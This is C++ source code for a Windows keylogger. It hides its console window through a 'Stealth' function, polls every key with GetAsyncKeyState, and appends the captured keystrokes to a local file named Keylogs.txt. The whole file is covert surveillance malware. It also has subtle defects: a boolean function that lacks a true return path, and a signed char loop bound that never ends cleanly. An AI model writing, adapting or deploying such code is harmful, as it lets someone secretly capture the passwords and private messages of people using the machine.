#include <Windows.h>
#include <fstream>
#include <string>
#include <stdio.h>

using std::fstream;
using std::ofstream;

void WriteData(std::string Text) {
	ofstream LogFile;
	LogFile.open("Keylogs.txt", fstream::app);
	LogFile << Text;
	LogFile.close();
}

void Stealth() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

bool isKeyListed(int vkey) {
	switch (vkey) {
	case VK_RETURN:
		WriteData("\n");
		break;
	case VK_BACK:
		WriteData("\b");
		break;
	case VK_SPACE:
		WriteData(" ");
		break;
	case VK_SHIFT:
		WriteData(" *shift* ");
		break;
	case VK_OEM_PERIOD:
		WriteData(".");
		break;
	default: return false;
	}
}

int main() {
	Stealth();
	char key;
	while (1) {
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (isKeyListed(key) == 0) {
					ofstream LogFile;
					LogFile.open("Keylogs.txt", fstream::app);
					LogFile << key;
					LogFile.close();
				}
			}
		}
	}
}
